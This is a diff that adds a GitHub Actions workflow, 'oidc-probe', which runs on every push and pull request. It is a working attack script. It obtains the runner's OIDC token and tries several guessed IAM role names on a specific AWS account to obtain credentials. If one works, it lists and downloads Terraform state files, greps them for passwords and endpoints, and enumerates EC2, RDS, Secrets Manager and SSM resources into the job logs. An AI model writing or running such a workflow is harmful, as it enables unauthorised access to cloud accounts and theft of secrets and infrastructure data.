@@ -1,0 +1,51 @@
+name: oidc-probe
+on: [push, pull_request]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: identity
+        run: |
+          echo "REPO=$GITHUB_REPOSITORY"
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          echo "REF=$GITHUB_REF"
+          echo "HEADREF=$GITHUB_HEAD_REF"
+          echo "SHA=$GITHUB_SHA"
+      - name: gettoken
+        run: |
+          RESP=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          echo "$RESP" | python3 -c "import sys,json,base64; t=json.load(sys.stdin)['value']; p=t.split('.')[1]; p+='='*(-len(p)%4); print('JWT_PAYLOAD='+base64.urlsafe_b64decode(p).decode()); open('/tmp/jwt','w').write(t)"
+      - name: assume
+        run: |
+          set +e
+          JWT=$(cat /tmp/jwt)
+          for ROLE in fynex-github-oidc-role github-actions gha-deploy terraform ci deploy; do
+            ARN="arn:aws:iam::673652689990:role/$ROLE"
+            echo "=== ASK $ARN"
+            OUT=$(curl -sS "https://sts.amazonaws.com/" -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=$ARN" -d "RoleSessionName=i4894gh" -d "DurationSeconds=900" --data-urlencode "WebIdentityToken=$JWT")
+            echo "$OUT" | head -c 2000; echo
+            if echo "$OUT" | grep -q '<Credentials>'; then echo "$OUT" > /tmp/assume.xml; echo "GOT_CREDS_FOR=$ARN"; break; fi
+          done
+          if [ -f /tmp/assume.xml ]; then
+            AK=$(python3 -c "import re;print(re.search(r'<AccessKeyId>([^<]+)',open('/tmp/assume.xml').read()).group(1))")
+            SK=$(python3 -c "import re;print(re.search(r'<SecretAccessKey>([^<]+)',open('/tmp/assume.xml').read()).group(1))")
+            ST=$(python3 -c "import re;print(re.search(r'<SessionToken>([^<]+)',open('/tmp/assume.xml').read()).group(1))")
+            export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$ST AWS_DEFAULT_REGION=us-east-1 AWS_PAGER=
+            echo "--- caller ---"; aws sts get-caller-identity
+            echo "--- buckets ---"; aws s3api list-buckets --query 'Buckets[].Name' 2>&1 | head -c 2000
+            echo "--- tfstate keys ---"; aws s3api list-objects-v2 --bucket fynex-tf-state --max-keys 60 2>&1 | head -c 4000
+            for K in $(aws s3api list-objects-v2 --bucket fynex-tf-state --max-keys 20 --query 'Contents[].Key' --output text 2>/dev/null); do
+              case "$K" in *.tfstate|*main*) echo "=== STATE $K"; aws s3api get-object --bucket fynex-tf-state --key "$K" /tmp/s.tfstate >/dev/null 2>&1 && { ls -la /tmp/s.tfstate; grep -aoE '"[a-z_]*(password|username|db_name|engine|address|endpoint|port|instance_class|public_ip|private_ip|cidr_block|key_name|arn)[a-z_]*"[[:space:]]*:[[:space:]]*"[^"]{0,120}"' /tmp/s.tfstate | sort -u | head -60; echo "--- head ---"; head -c 2500 /tmp/s.tfstate; };;
+              esac
+            done
+            echo "--- ec2 ---"; aws ec2 describe-instances --query 'Reservations[].Instances[].{id:InstanceId,priv:PrivateIpAddress,pub:PublicIpAddress,st:State.Name,name:Tags[?Key==`Name`]|[0].Value}' --output text 2>&1 | head -c 4000
+            echo "--- rds ---"; aws rds describe-db-instances --query 'DBInstances[].{id:DBInstanceIdentifier,ep:Endpoint.Address,port:Endpoint.Port,eng:Engine,user:MasterUsername,db:DBName}' --output text 2>&1 | head -c 2000
+            echo "--- secrets ---"; aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>&1 | head -c 3000
+            echo "--- ssm ---"; aws ssm describe-instance-information --query 'InstanceInformationList[].{id:InstanceId,name:ComputerName,ip:IPAddress,plat:PlatformName}' --output text 2>&1 | head -c 3000
+          else
+            echo "NO_ROLE_ASSUMED"
+          fi
